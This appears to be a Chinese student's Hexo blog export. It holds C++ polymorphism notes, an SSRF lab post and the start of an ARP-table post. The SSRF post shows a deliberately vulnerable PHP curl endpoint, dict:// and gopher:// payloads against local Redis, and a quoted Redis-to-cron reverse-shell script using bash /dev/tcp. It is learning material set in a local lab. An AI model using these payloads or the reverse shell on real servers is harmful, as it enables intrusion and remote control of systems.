<p>刚查资料,看到人家满满的证书,同样是大三了,我好菜啊,C++都不会,突然又想学算法了<br><a href="https://www.liuchuo.net/about" target="_blank" rel="external">https://www.liuchuo.net/about</a></p>
<p>继续<br>hack点: 静态成员变量不能类内初始化,因为静态的其实是属于类的,我们可以叫他<code>类变量</code>(可以这样子叫吗,反正我就这样子叫了),需要在类外初始化</p>
<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;cstdio></span></span>
<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span><span class="token operator">:</span>
        <span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span><span class="token operator">:</span>
        <span class="token keyword">static</span> <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    A a<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样子是会报error的</p>
<pre class="line-numbers language-cpp"><code class="language-cpp">error<span class="token operator">:</span> ISO C<span class="token operator">++</span> forbids in<span class="token operator">-</span><span class="token keyword">class</span> <span class="token class-name">initialization</span> of non<span class="token operator">-</span><span class="token keyword">const</span> <span class="token keyword">static</span> member ‘A<span class="token operator">::</span>a’
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>看起来是只有<code>const</code>的<code>static</code>才能类内初始化了</p>
<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;cstdio></span></span>
<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span><span class="token operator">:</span>
        <span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hello A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span><span class="token operator">:</span>
        <span class="token keyword">const</span> <span class="token keyword">static</span> <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    A a<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们加了个const果然通过了<br>所以<code>static</code>的成员变量要类外初始化</p>
<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">int</span> A<span class="token operator">::</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h2><h2 id="申明"><a href="#申明" class="headerlink" title="申明"></a>申明</h2><ul>
<li><code>构造函数</code>申明不能包含初始化参数列表</li>
<li><code>派生类</code>申明不能包含派生列表</li>
</ul>
<h2 id="final"><a href="#final" class="headerlink" title="final"></a>final</h2><p>final 可以防止继承发生(Java里面好像也是这样子吧)</p>
<h2 id="静态类型-amp-动态类型"><a href="#静态类型-amp-动态类型" class="headerlink" title="静态类型 &amp; 动态类型"></a>静态类型 &amp; 动态类型</h2><ul>
<li>如果表达式不是<code>指针</code>或者<code>引用</code>的话,那他的动态和静态类型就是一样的</li>
<li>指针或者引用的静态类型和动态类型不同这一事实正是C++支持多态的根本所在</li>
</ul>
<h2 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h2><blockquote>
<p>基类虚函数设计出来大部分是为了让子类来override实现多态的</p>
</blockquote>
<p>hack点: 我们必须为每一个虚函数都提供定义<br>当某个虚函数通过指针或者引用调用的时候,编译器产生的代码直到运行时才能知道该调用哪一个(动态绑定),好吧,感觉这句话提到了N次</p>
<p>个人理解:<br>动态 =&gt; 运行时<br>静态 =&gt; 编译时<br>这里突然想到了<code>动态链接库dll(Linux *.so)</code>和<code>静态链接库lib(Linux *.a)</code></p>
<p>hack点: 只有虚函数能override,此时参数列表和返回值应该一致,相当于是基类规定了接口,派生类里你要照着子类的接口规范来override虚函数(还有好像是说,派生类里有virtual字样,子类override对应函数就可以不写virtual字样了), 那种参数列表不一样的就是重载啦,和我们这个木有关系,好像是重载是编译时就确定了的吧</p>
<blockquote>
<p>只有类的普通成员函数可以定义为虚函数，全局函数及静态成员函数（类拥有）不能声明为虚函数。</p>
</blockquote>
<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>我理解多态主要是由虚函数来体现的</p>
<blockquote>
<p>当我们使用基类(静态类型)的引用或者指针调用基类中定义的一个函数时候,我们并不知道这个函数真正作用的对象,他可能是一个基类对象也可能是一个派生类的对象.如果这个函数是虚函数,那么直到运行时才会决定到底执行哪个版本.判断的依据是引用或者指针所绑定的对象的真实类型.</p>
</blockquote>
<p>综合上面,只有当</p>
<ol>
<li>通过指针或者引用</li>
<li>来调用虚函数的时候<br>才可能出现运行时绑定,即为动态和静态类型不同</li>
</ol>
<blockquote>
<p>注意下文提到的各种转换,如果没有特别强调,说的都是对象指针类型,不是对象类型</p>
</blockquote>
<p>一定要注意这两个条件<br>如果函数不虚也可以哦…不虚的函数也是编译时候就确定了,就是看静态类型<br>一个栗子,学会了个单词</p>
<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;cstdio></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">Base</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span><span class="token operator">:</span>
        <span class="token keyword">void</span> <span class="token function">nf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"normal f from Base\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">vf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"virtual f from Base\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">Derived</span> <span class="token operator">:</span> <span class="token keyword">public</span> Base <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//我今天才知道这个词是派生</span>
    <span class="token keyword">public</span><span class="token operator">:</span>
        <span class="token keyword">void</span> <span class="token function">nf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"normal f from Derived\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">vf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"virtual f from Derived\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    Derived d1<span class="token punctuation">;</span>
    Base <span class="token operator">*</span> b1 <span class="token operator">=</span> <span class="token operator">&amp;</span>d1<span class="token punctuation">;</span>
    b1 <span class="token operator">-</span><span class="token operator">></span> <span class="token function">nf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    b1 <span class="token operator">-</span><span class="token operator">></span> <span class="token function">vf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">/*
 * normal f from Base   //静态
 * virtual f from Derived   //动态绑定
 */</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果用引用的话也是一样的结果</p>
<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    Derived d1<span class="token punctuation">;</span>
    Base <span class="token operator">&amp;</span> b1 <span class="token operator">=</span> d1<span class="token punctuation">;</span>
    b1<span class="token punctuation">.</span><span class="token function">nf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    b1<span class="token punctuation">.</span><span class="token function">vf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">/*
 * normal f from Base   //静态
 * virtual f from Derived   //动态绑定
 */</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果不是用指针或者引用的话,就像下面提到的<code>对象直接赋值</code>,仔细看啊,就比前面的例子少了一个引用符号,结果就很悲剧了!</p>
<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    Derived d1<span class="token punctuation">;</span>
    Base b1 <span class="token operator">=</span> d1<span class="token punctuation">;</span>
    b1<span class="token punctuation">.</span><span class="token function">nf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    b1<span class="token punctuation">.</span><span class="token function">vf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">/* 
 * normal f from Base => 静态
 * virtual f from Base => 静态
 */</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>就是这个厉害的派生对象就废掉了,就变成普通的鸡肋对象了,而且这个时候即便再强制赋值回来也没啥用了 <em>其实是根本赋值不回来了…</em> 继续往下看</p>
<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    Derived d1<span class="token punctuation">;</span>
    Base b1 <span class="token operator">=</span> d1<span class="token punctuation">;</span>
    Derived d2 <span class="token operator">=</span> b1<span class="token punctuation">;</span>
    b1<span class="token punctuation">.</span><span class="token function">nf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    b1<span class="token punctuation">.</span><span class="token function">vf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    d2<span class="token punctuation">.</span><span class="token function">nf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    d2<span class="token punctuation">.</span><span class="token function">vf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>因为是基类转为子类(其实就没有这种操作),所以会提示你强制转化,然后你准备碰个运气强制一波</p>
<pre class="line-numbers language-cpp"><code class="language-cpp">Derived d2 <span class="token operator">=</span> <span class="token punctuation">(</span>Derived<span class="token punctuation">)</span>b1<span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个时候就会报一万个<code>error</code>了</p>
<pre class="line-numbers language-cpp"><code class="language-cpp">error<span class="token operator">:</span> no matching function <span class="token keyword">for</span> call to ‘Derived<span class="token operator">::</span><span class="token function">Derived</span><span class="token punctuation">(</span>Base<span class="token operator">&amp;</span><span class="token punctuation">)</span>’
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个时候我们彻彻底底的相信了,这个对象类型直接赋值是没有传说中的多态出现的,如果我们还要把他弄回去,,还会报错</p>
<p>那我们试一下如果是指针呢,向下转型虽然是危险的,但是不是可行呢</p>
<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    Base <span class="token operator">*</span> b1 <span class="token operator">=</span> <span class="token keyword">new</span> Base<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 对了记得用了指针要new一下,不然这就是个野指针了,访问到不可思议的内存就会</span>
    Derived <span class="token operator">*</span> d1 <span class="token operator">=</span> <span class="token punctuation">(</span>Derived <span class="token operator">*</span><span class="token punctuation">)</span>b1<span class="token punctuation">;</span>
    b1 <span class="token operator">-</span><span class="token operator">></span> <span class="token function">nf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    b1 <span class="token operator">-</span><span class="token operator">></span> <span class="token function">vf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">/* 
 * normal f from Base
 * virtual f from Base
 */</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>还有这种操作? 确实是可以的,但是么有什么意义</p>
<p>好吧我只有一个疑问了,就是赋值来来回回<code>Derived</code>=&gt;<code>Base</code>=&gt;<code>Derived</code>,这样子一圈下来还能安好咩</p>
<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    Derived <span class="token operator">*</span> d1 <span class="token operator">=</span> <span class="token keyword">new</span> Derived<span class="token punctuation">;</span>
    Base <span class="token operator">*</span> b1 <span class="token operator">=</span> d1<span class="token punctuation">;</span>
    Derived <span class="token operator">*</span> d2 <span class="token operator">=</span> <span class="token punctuation">(</span>Derived <span class="token operator">*</span><span class="token punctuation">)</span>b1<span class="token punctuation">;</span>
    d1 <span class="token operator">-</span><span class="token operator">></span> <span class="token function">nf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    d1 <span class="token operator">-</span><span class="token operator">></span> <span class="token function">vf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    b1 <span class="token operator">-</span><span class="token operator">></span> <span class="token function">nf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    b1 <span class="token operator">-</span><span class="token operator">></span> <span class="token function">vf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    d2 <span class="token operator">-</span><span class="token operator">></span> <span class="token function">nf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    d2 <span class="token operator">-</span><span class="token operator">></span> <span class="token function">vf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">/* normal f from Derived
 * virtual f from Derived
 * normal f from Base
 * virtual f from Derived
 * normal f from Derive     => 安好
 * virtual f from Derived   => 安好
 */</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>好吧,果然还是安好的,其实早就应该想到指针这样丢来丢去,根本不会影响到内存中Derived实例的结构</p>
<p>其实上面的这个<code>nf</code>是与多态无关的,静态时候决定,就是用谁的指针,就是调用谁的函数,所以刚刚还偷偷试了下<br>即便这样子,还是能输出这个<code>nf</code>,大概这就是命(划掉,静态)吧,编译时候就决定好了的东西</p>
<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    Derived <span class="token operator">*</span> d1 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    d1 <span class="token operator">-</span><span class="token operator">></span> <span class="token function">nf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    d1 <span class="token operator">-</span><span class="token operator">></span> <span class="token function">vf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="派生类向基类的隐式转换"><a href="#派生类向基类的隐式转换" class="headerlink" title="派生类向基类的隐式转换"></a>派生类向基类的隐式转换</h3><p>hack点: 基类不能向派生类隐式转换,即使是<code>派生=&gt; 基本类 =&gt; 派生</code>这样子的也不可以就是说原来是把一个派生类对象地址丢给了基本类的指针变量(这一步合理合情合法),再把这个变量丢给派生类对象指针也不行,即便他指的其实是派生类对象(这里是说隐式转换,我们可暴力的进行转换,就像我上面的例子,只是说隐式转换的话编译器不给你过)</p>
<blockquote>
<p>当然必要的时候也可以强制向下转型? 虽然很危险.(人家都说危险,我也觉得它危险好了)</p>
</blockquote>
<p>hack点: 这些奇怪的各种各样为了实现多态的转换之类的,都是<code>指针</code>或者<code>引用</code>的操作,所以直接对象直接赋值是没啥用的,比如:如果用一个派生类对象给一个基类对象初始化或者赋值,只有基类的那一部分会被复制,派生类部分会直接被忽略(切割掉)</p>
<h2 id="继承-挖坑-然后填"><a href="#继承-挖坑-然后填" class="headerlink" title="继承 (挖坑,然后填)"></a>继承 (挖坑,然后填)</h2><h3 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h3><p>感觉像是接口,java里就不能多重继承</p>
<h3 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h3><h3 id="虚继承"><a href="#虚继承" class="headerlink" title="虚继承"></a>虚继承</h3>]]></content>
      
        
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[跳转]]></title>
      <url>/2017/06/02/%E8%B7%B3%E8%BD%AC/</url>
      <content type="html"><![CDATA[<h2 id="服务器跳转"><a href="#服务器跳转" class="headerlink" title="服务器跳转"></a>服务器跳转</h2><h2 id="客户端跳转"><a href="#客户端跳转" class="headerlink" title="客户端跳转"></a>客户端跳转</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://hack0nair.me/2013-04-24-e9-a1-b5-e9-9d-a2-e8-b7-b3-e8-bd-ac-e7-9a-84-e5-87-a0-e7-a7-8d-e6-96-b9-e5-bc-8f/" target="_blank" rel="external">https://hack0nair.me/2013-04-24-e9-a1-b5-e9-9d-a2-e8-b7-b3-e8-bd-ac-e7-9a-84-e5-87-a0-e7-a7-8d-e6-96-b9-e5-bc-8f/</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ssrf从入门到入门]]></title>
      <url>/2017/06/02/ssrf%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>在hosts里面绑了个<code>www.eval.com</code><br>mkdir了个ssrf文件夹放相关的的文件<br>比如<code>index.php</code></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token shell-comment comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token shell-comment comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span>
<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><h4 id="dict获取redis信息"><a href="#dict获取redis信息" class="headerlink" title="dict获取redis信息"></a>dict获取redis信息</h4><pre class="line-numbers language-bash"><code class="language-bash">eval@linux: curl http://www.eval.com/ssrf/?url<span class="token operator">=</span>dict://127.0.0.1:6379/info

<span class="token comment" spellcheck="true"># Server</span>
redis_version:3.0.6
redis_git_sha1:00000000
redis_git_dirty:0
<span class="token punctuation">..</span>.
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>获取ssh信息</p>
<pre class="line-numbers language-bash"><code class="language-bash">curl <span class="token string">'http://www.eval.com/ssrf/index.php?url=dict://127.0.0.1:22/info'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="gopher回显数据"><a href="#gopher回显数据" class="headerlink" title="gopher回显数据"></a>gopher回显数据</h4><pre class="line-numbers language-bash"><code class="language-bash">eval@attacker: curl -v <span class="token string">'http://www.eval.com/ssrf/index.php?url=gopher://127.0.0.1:2333/_Hello'</span>

haibin@caiji: nc -l -vv 2333
Listening on <span class="token punctuation">[</span>0.0.0.0<span class="token punctuation">]</span> <span class="token punctuation">(</span>family 0, port 2333<span class="token punctuation">)</span>
Hello
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以测试确认是不是能用gopher</p>
<h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><p>dict://ip:port/command:data1:data2 向服务器的端口请求<code>command data1 data2</code><br>所以<br><code>curl dict://127.0.0.1:6379/info</code><br>其实就相当于</p>
<pre><code>haibin@pc: nc 127.0.0.1 6379
info
</code></pre><p>所以可以一步一步构造<br>gopher可以一键getshell<br>而dict要一步一步构造</p>
<h2 id="看人家这个redis反弹shell"><a href="#看人家这个redis反弹shell" class="headerlink" title="看人家这个redis反弹shell"></a>看人家这个redis反弹shell</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> -e <span class="token string">"\n\n*/1 * * * * bash -i >&amp; /dev/tcp/127.0.0.1/2333 0>&amp;1\n\n"</span><span class="token operator">|</span>redis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> -x <span class="token keyword">set</span> 1
redis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> config <span class="token keyword">set</span> <span class="token function">dir</span> /var/spool/cron/
redis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> config <span class="token keyword">set</span> dbfilename root
redis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> save
redis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> quit
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后跑</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> shell.sh 127.0.0.1 6379
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>$1: 127.0.0.1<br>$2: 6379</p>
<h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h2><pre class="line-numbers language-bash"><code class="language-bash">curl gopher://ip:port/_payload
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>有个下划线咩<br>具体payload怎么写,要抓流量,相当于是重放攻击,就是把执行操作时候实际来往的流量抓下来(不知道这麽说对不对)<br>所以可用<code>socat -v</code> (-v是显示详细信息,利用这个详细信息写payload咩)</p>
<pre class="line-numbers language-bash"><code class="language-bash">socat -v tcp-listen:4444,fork tcp-connect:localhost:6379
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后利用gopher转换规则</p>
<ul>
<li>如果第一个字符是<code>&gt;</code>或者<code>&lt;</code>那么丢弃该行字符串，表示请求和返回的时间。</li>
<li>如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。</li>
<li>将\r字符串替换成%0d%0a</li>
<li>空白行替换为%0a</li>
</ul>
<p>最后如果<code>gophar://xxx:6379/_payload</code>要作为url参数的话就得要<code>urlencode</code>一下的</p>
<p>这部分参考<br><a href="http://joychou.org/index.php/web/phpssrf.html" target="_blank" rel="external">http://joychou.org/index.php/web/phpssrf.html</a><br>很详细</p>
<h2 id="常常看到的302-php"><a href="#常常看到的302-php" class="headerlink" title="常常看到的302.php"></a>常常看到的302.php</h2><p><a href="http://blog.feei.cn/ssrf/" target="_blank" rel="external">http://blog.feei.cn/ssrf/</a><br>这篇写的真的超级清楚</p>
<p>自己拿vps挂个302.php跳一下不是必须的<br>是在某种情况(限制了可用协议为http(s),但支持CURLOPT_FOLLOWLOCATION)下的周转措施</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.91ri.org/17111.html" target="_blank" rel="external">http://www.91ri.org/17111.html</a> (ssrf)<br><a href="http://www.dict.org/rfc2229.txt" target="_blank" rel="external">http://www.dict.org/rfc2229.txt</a> (dict协议)<br><a href="https://www.waitalone.cn/linux-shell-rebound-under-way.html" target="_blank" rel="external">https://www.waitalone.cn/linux-shell-rebound-under-way.html</a> (反弹shell方法)<br><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="external">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a> (没看懂)<br><a href="http://joychou.org/index.php/web/phpssrf.html" target="_blank" rel="external">http://joychou.org/index.php/web/phpssrf.html</a> (ssrf 超级详细)<br><a href="http://blog.feei.cn/ssrf/" target="_blank" rel="external">http://blog.feei.cn/ssrf/</a><br><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="external">https://blog.chaitin.cn/gopher-attack-surfaces/</a> (长亭)<br><a href="http://blog.feei.cn/redis/" target="_blank" rel="external">http://blog.feei.cn/redis/</a> (redis to getshell) 超详细<br><a href="http://www.freebuf.com/articles/web/20407.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/20407.html</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[off by one]]></title>
      <url>/2017/06/02/off-by-one/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[路由器和交换机都有哪些表]]></title>
      <url>/2017/06/01/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8C%E4%BA%A4%E6%8D%A2%E6%9C%BA%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%A1%A8/</url>
      <content type="html"><![CDATA[<blockquote>
<p>我的是Linux,不知道win是不是差不多</p>
</blockquote>
<h2 id="路由器-amp-PC"><a href="#路由器-amp-PC" class="headerlink" title="路由器 &amp; PC"></a>路由器 &amp; PC</h2><h3 id="ARP表"><a href="#ARP表" class="headerlink" title="ARP表"></a>ARP表</h3><h4 id="pc"><a href="#pc" class="headerlink" title="pc"></a>pc</h4><pre><code>arp [-a]        两种不同的显示arp表的方法
arp -d          删除
